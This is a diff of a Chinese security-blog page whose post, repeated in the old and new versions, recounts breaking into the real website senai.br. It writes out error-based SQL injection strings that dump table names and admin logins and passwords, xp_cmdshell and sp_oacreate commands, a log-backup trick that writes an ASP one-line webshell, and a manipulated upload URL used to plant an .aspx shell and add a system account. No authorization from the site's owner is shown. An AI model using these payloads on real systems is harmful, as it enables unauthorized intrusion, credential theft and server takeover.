@@ -1,155 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>入侵巴西最大门户网站 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>入侵巴西最大门户网站 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="标题:入侵巴西最大门户网站  作者:hackdn  转载注明  大家新年好，过年了，2012你的船票买好了么？  今天是除夕，貌似农历没大年三十  下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，  主要是后台拿SHELL费劲了半天，高手直接飞过吧。。  巴西最大门户网站www.senai.br（塞纳工业 - -！）  GG搜了下，出来的点肯定都是不能直接注入的，该过滤的都过滤掉了~  工具扫了下，IIS 6的组建，幸好找到了后台路径  http://www.senai.br/admin/login.aspx    弱口令试了遍，进不去，’or’’=’ 没反应’or’=’or’直接报错，幸亏没禁MAGIC.">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="入侵巴西最大门户网站 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/600.seo/" title="入侵巴西最大门户网站" itemprop="url">入侵巴西最大门户网站</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-06-23T08:12:10.000Z" itemprop="datePublished">2012-06-23</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>标题:入侵巴西最大门户网站</p>  <p>作者:hackdn</p>  <p>转载注明</p>  <p>大家新年好，过年了，2012你的船票买好了么？</p>  <p>今天是除夕，貌似农历没大年三十</p>  <p>下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，</p>  <p>主要是后台拿SHELL费劲了半天，高手直接飞过吧。。</p>  <p>巴西最大门户网站<a href="http://www.senai.br/" target="_blank" rel="external">www.senai.br</a>（塞纳工业 - -！）</p>  <p>GG搜了下，出来的点肯定都是不能直接注入的，该过滤的都过滤掉了~</p>  <p>工具扫了下，IIS 6的组建，幸好找到了后台路径</p>  <p><a href="http://www.senai.br/admin/login.aspx" target="_blank" rel="external">http://www.senai.br/admin/login.aspx</a>    <br>弱口令试了遍，进不去，’or’’=’ 没反应’or’=’or’直接报错，幸亏没禁MAGIC.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image001.jpg" width="858" height="671"></p>  <p></p><a id="more"></a><p>看返回的组建信息，权限应该是SYS的错不了</p>  <p>好吧，试试可否执行语句</p>  <p>直接登陆框’and ( select @ @ version )=1–如图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image002.jpg" width="832" height="325"></p>  <p>哎，到这里大家该散的就散了，下面都是一般的步骤</p>  <p>‘/<strong>/and/</strong>/user=1–</p>  <p>SQL用户是senai_web</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/db_name())=1–</strong></p>  <p>database:SENAI_WEB</p>  <p>直接爆吧   <br>‘//and/<strong>/</strong></p>  <p>(select//top/<strong>/1/</strong>/name/<strong>/from/</strong>/senai_web.dbo.sysobjects/<strong>/where/</strong>/xtype=’U’)=1–</p>  <p>Material_Equipamento_Produto</p>  <p>应该不是这表，加进去   <br>‘/<strong>/and/</strong>/</p>  <p>(select/<strong>/top/</strong>/1/<strong>/name/</strong>/from/<strong>/senai_web.dbo.sysobjects/</strong>/where/<strong>/xtype=’U’/</strong>/an</p>  <p>d/<strong>/name/</strong>/not/<strong>/in/</strong>/(‘Material_Equipamento_Produto’,’Materia’))=1–</p>  <p>之后爆到Materia就不动了。 - -</p>  <p>OK，直接：   <br>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Materia’),1)/</strong>/from Materia)=1–    <br>还是Materia</p>  <p>考虑，这样子效率太低了，用HAVING试试   <br>‘/<strong>/having/</strong>/1=1–&#160;&#160;&#160;&#160; 直接出来了表结果’Usuarios.usuCodigo’</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image003.jpg" width="636" height="170"></p>  <p>实在是不懂巴西文~</p>  <p>谷歌翻译了下Usuarios意识是用户名</p>  <p>admin不出来Usuarios就应该是对的了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Usuarios’),1)/</strong>/from Usuarios)=1–</p>  <p>出来usuCodigo，试了好久不是用户名的列。第二个是usuSenha，这个肯定是密码的。</p>  <p>第四个ID才是usuLogin的用户名。好了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/usuLogin++usuSenha/</strong>/from/**/Usuarios)=1–</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image004.jpg" width="819" height="245"></p>  <p>click agclick</p>  <p>出来的账户密码直接后台登进去了</p>  <p>进去傻眼了，都是鸟文 如图。装了几个翻译插件都用不了。。。。</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image005.jpg" width="671" height="539"></p>  <p>好吧，退出来，希望登陆界面的MSSQL权限是SA<del>~~就直接ADD CMD_SHELL组建吧</del></p>  <p>Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>  <p>返回必须SYS权限，郁闷</p>  <p>试试sp_oacreate：</p>  <p>‘ Declare @s int;exec sp_oacreate ‘wscript.shell’,@s out;Exec SP_OAMethod</p>  <p>@s,’run’,NULL,’cmd.exe /c echo ^&lt;%execute(request(char(35)))%</p>  <p>^&gt;&gt;C:\Inetpub\wwwroot\ProjetoSenai2\Componentes_Codigos_fontes\Admin\1.txt’;</p>  <p>路径为返回爆出的路径</p>  <p>可惜没权限。。。。sp_makewebtask也不行</p>  <p>好吧，寄权限与DB权限咯，不能差异备份就邪门了~！！！</p>  <p>‘ create table <a href="[cmd] [image]">hackdn_cmd</a>;declare @a sysname,@s nvarchar(4000)select</p>  <p>@a=db_name(),@s=0x62696E backup log @a to into <a href="cmd">hackdn_cmd</a>values(‘&lt;%</p>  <p>execute(request(chr(35)))%&gt;’);declare @b sysname,@t nvarchar(4000)select @b=db_name</p>  <p>(),@t=’D:\Dados\datainet\www\ENSI\SENAI\Site Senai\Web\1.txt’ backup log @b to with</p>  <p>init,no_truncate;drop table [hackdn_cmd];</p>  <p>再访问，也不行。。。</p>  <p>苦逼了很久才找到上传点</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image006.jpg" width="478" height="388"></p>  <p>可惜过滤了后缀呀。。。上传asp;jpg也自动修改为随机MD5的JPG了</p>  <p>好吧，瞎转悠后，发现了这个上传点的路径为：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/publicacoes/&amp;field=pub</p>  <p>licacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArq</p>  <p>uivoField=publicacoes_tamanhoDoArquivo</p>  <p>看到了上传的文件目录，希望它是单文件没过滤哈<del></del></p>  <p>抱着试试看的心态修改下上传目录：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/1.asp/&amp;field=publicaco</p>  <p>es_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoFi</p>  <p>eld=publicacoes_tamanhoDoArquivo</p>  <p>上传成功！！！直接返回了路径呀~如图：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image007.jpg" width="619" height="259"></p>  <p>可惜打不开，而且图中的返回信息也说得是Could not find a part of the path。找不到路径啊   <br>估计肯定是没建立目录了。。。</p>  <p>仔细看了看URL，尼玛直接把tipoArquivo输入值作为最后判定的FILE赋值的后缀 - -！</p>  <p>好吧，直接修改成aspx的判定后缀试试~   <br><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo</a></p>  <p>上传后右键源码直接看到了地址！！</p>  <p>OK，SHELL就直接拿到手了，在线CMD可以直接加SYS账户</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image008.jpg" width="486" height="224"></p>  <p>就这样了，详细也够啰嗦了。。。等着一会儿看春晚咯~</p>  <p>祝大家龙年事业顺利，顺心如意，家庭和睦，快快乐乐发大财！！！</p>  <p>常规的<a href="http://ha.cker.in/tag/SQLServer" target="_blank">SQLServer</a>+ASP.NET注入Sa权限<a href="http://ha.cker.in/tag/拿Webshell" target="_blank">拿Webshell</a>简单<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>。</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-06-23T08:12:10.000Z" itemprop="datePublished">
-          2012-06-23
-      </time>
-    
-    
-    | 
-    <a href='/tag/提权/'>提权</a>,
-    
-    <a href='/tag/SQLServer/'>SQLServer</a>,
-    
-    <a href='/tag/Sa/'>Sa</a>,
-    
-    <a href='/tag/拿Webshell/'>拿Webshell</a>
-    
-    
-</span>
-    <h1 class="post-title">入侵巴西最大门户网站</h1>
-    <section class="post-content">
-      <p>标题:入侵巴西最大门户网站</p>  <p>作者:hackdn</p>  <p>转载注明</p>  <p>大家新年好，过年了，2012你的船票买好了么？</p>  <p>今天是除夕，貌似农历没大年三十</p>  <p>下午上网没事儿做，朋友甩来一网站，让我顺便帮帮安检了下，他让发下过程，就随便写写，有点乱，</p>  <p>主要是后台拿SHELL费劲了半天，高手直接飞过吧。。</p>  <p>巴西最大门户网站<a href="http://www.senai.br/" target="_blank" rel="external">www.senai.br</a>（塞纳工业 - -！）</p>  <p>GG搜了下，出来的点肯定都是不能直接注入的，该过滤的都过滤掉了~</p>  <p>工具扫了下，IIS 6的组建，幸好找到了后台路径</p>  <p><a href="http://www.senai.br/admin/login.aspx" target="_blank" rel="external">http://www.senai.br/admin/login.aspx</a>    <br>弱口令试了遍，进不去，’or’’=’ 没反应’or’=’or’直接报错，幸亏没禁MAGIC.</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image001.jpg" width="858" height="671"></p>  <p></p><a id="more"></a><p>看返回的组建信息，权限应该是SYS的错不了</p>  <p>好吧，试试可否执行语句</p>  <p>直接登陆框’and ( select @ @ version )=1–如图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image002.jpg" width="832" height="325"></p>  <p>哎，到这里大家该散的就散了，下面都是一般的步骤</p>  <p>‘/<strong>/and/</strong>/user=1–</p>  <p>SQL用户是senai_web</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/db_name())=1–</strong></p>  <p>database:SENAI_WEB</p>  <p>直接爆吧   <br>‘//and/<strong>/</strong></p>  <p>(select//top/<strong>/1/</strong>/name/<strong>/from/</strong>/senai_web.dbo.sysobjects/<strong>/where/</strong>/xtype=’U’)=1–</p>  <p>Material_Equipamento_Produto</p>  <p>应该不是这表，加进去   <br>‘/<strong>/and/</strong>/</p>  <p>(select/<strong>/top/</strong>/1/<strong>/name/</strong>/from/<strong>/senai_web.dbo.sysobjects/</strong>/where/<strong>/xtype=’U’/</strong>/an</p>  <p>d/<strong>/name/</strong>/not/<strong>/in/</strong>/(‘Material_Equipamento_Produto’,’Materia’))=1–</p>  <p>之后爆到Materia就不动了。 - -</p>  <p>OK，直接：   <br>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Materia’),1)/</strong>/from Materia)=1–    <br>还是Materia</p>  <p>考虑，这样子效率太低了，用HAVING试试   <br>‘/<strong>/having/</strong>/1=1–&#160;&#160;&#160;&#160; 直接出来了表结果’Usuarios.usuCodigo’</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image003.jpg" width="636" height="170"></p>  <p>实在是不懂巴西文~</p>  <p>谷歌翻译了下Usuarios意识是用户名</p>  <p>admin不出来Usuarios就应该是对的了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/col_name(object_id(‘Usuarios’),1)/</strong>/from Usuarios)=1–</p>  <p>出来usuCodigo，试了好久不是用户名的列。第二个是usuSenha，这个肯定是密码的。</p>  <p>第四个ID才是usuLogin的用户名。好了</p>  <p>‘/<strong>/and/</strong>/(select/<strong>/top/</strong>/1/<strong>/usuLogin++usuSenha/</strong>/from/**/Usuarios)=1–</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image004.jpg" width="819" height="245"></p>  <p>click agclick</p>  <p>出来的账户密码直接后台登进去了</p>  <p>进去傻眼了，都是鸟文 如图。装了几个翻译插件都用不了。。。。</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image005.jpg" width="671" height="539"></p>  <p>好吧，退出来，希望登陆界面的MSSQL权限是SA<del>~~就直接ADD CMD_SHELL组建吧</del></p>  <p>Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>  <p>返回必须SYS权限，郁闷</p>  <p>试试sp_oacreate：</p>  <p>‘ Declare @s int;exec sp_oacreate ‘wscript.shell’,@s out;Exec SP_OAMethod</p>  <p>@s,’run’,NULL,’cmd.exe /c echo ^&lt;%execute(request(char(35)))%</p>  <p>^&gt;&gt;C:\Inetpub\wwwroot\ProjetoSenai2\Componentes_Codigos_fontes\Admin\1.txt’;</p>  <p>路径为返回爆出的路径</p>  <p>可惜没权限。。。。sp_makewebtask也不行</p>  <p>好吧，寄权限与DB权限咯，不能差异备份就邪门了~！！！</p>  <p>‘ create table <a href="[cmd] [image]">hackdn_cmd</a>;declare @a sysname,@s nvarchar(4000)select</p>  <p>@a=db_name(),@s=0x62696E backup log @a to into <a href="cmd">hackdn_cmd</a>values(‘&lt;%</p>  <p>execute(request(chr(35)))%&gt;’);declare @b sysname,@t nvarchar(4000)select @b=db_name</p>  <p>(),@t=’D:\Dados\datainet\www\ENSI\SENAI\Site Senai\Web\1.txt’ backup log @b to with</p>  <p>init,no_truncate;drop table [hackdn_cmd];</p>  <p>再访问，也不行。。。</p>  <p>苦逼了很久才找到上传点</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image006.jpg" width="478" height="388"></p>  <p>可惜过滤了后缀呀。。。上传asp;jpg也自动修改为随机MD5的JPG了</p>  <p>好吧，瞎转悠后，发现了这个上传点的路径为：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/publicacoes/&amp;field=pub</p>  <p>licacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArq</p>  <p>uivoField=publicacoes_tamanhoDoArquivo</p>  <p>看到了上传的文件目录，希望它是单文件没过滤哈<del></del></p>  <p>抱着试试看的心态修改下上传目录：</p>  <p><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx</a>?</p>  <p>publicacoes_Action=Upload&amp;tipoArquivo=doc,pdf&amp;localSave=../../upload/1.asp/&amp;field=publicaco</p>  <p>es_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoFi</p>  <p>eld=publicacoes_tamanhoDoArquivo</p>  <p>上传成功！！！直接返回了路径呀~如图：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image007.jpg" width="619" height="259"></p>  <p>可惜打不开，而且图中的返回信息也说得是Could not find a part of the path。找不到路径啊   <br>估计肯定是没建立目录了。。。</p>  <p>仔细看了看URL，尼玛直接把tipoArquivo输入值作为最后判定的FILE赋值的后缀 - -！</p>  <p>好吧，直接修改成aspx的判定后缀试试~   <br><a href="http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo" target="_blank" rel="external">http://www.senai.br/admin/bibliotecaArquivos/upload.aspx?publicacoes_Action=Upload&amp;tipoArquivo=aspx&amp;localSave=../../upload/publicacoes/&amp;field=publicacoes_arquivo&amp;fieldSimples=arquivo&amp;tipoArquivoField=publicacoes_TipoDoArquivo&amp;tamanhoArquivoField=publicacoes_tamanhoDoArquivo</a></p>  <p>上传后右键源码直接看到了地址！！</p>  <p>OK，SHELL就直接拿到手了，在线CMD可以直接加SYS账户</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/795a2ecf8a47_1F1/clip_image008.jpg" width="486" height="224"></p>  <p>就这样了，详细也够啰嗦了。。。等着一会儿看春晚咯~</p>  <p>祝大家龙年事业顺利，顺心如意，家庭和睦，快快乐乐发大财！！！</p>  <p>常规的<a href="http://ha.cker.in/tag/SQLServer" target="_blank">SQLServer</a>+ASP.NET注入Sa权限<a href="http://ha.cker.in/tag/拿Webshell" target="_blank">拿Webshell</a>简单<a href="http://ha.cker.in/tag/提权" target="_blank">提权</a>。</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/600.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/600.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/600.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/600.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/603.seo/">
-        ← xss的发现与利用
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/596.seo/">
-        Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/提权/">提权</a><a href="/tag/SQLServer/">SQLServer</a><a href="/tag/Sa/">Sa</a><a href="/tag/拿Webshell/">拿Webshell</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/603.seo/" title="xss的发现与利用">
+  <strong>Prev:</strong><br/>
+  <span>
+  xss的发现与利用</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/596.seo/"  title="Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示">
+ <strong>Next:</strong><br/> 
+ <span>Microsoft RDP Vulnerability Exploit (CVE-2012-0002 ) 微软MS12-020漏洞视频演示
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-入侵巴西最大门户网站" data-title="入侵巴西最大门户网站" data-url="http://ha.cker.in/600.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
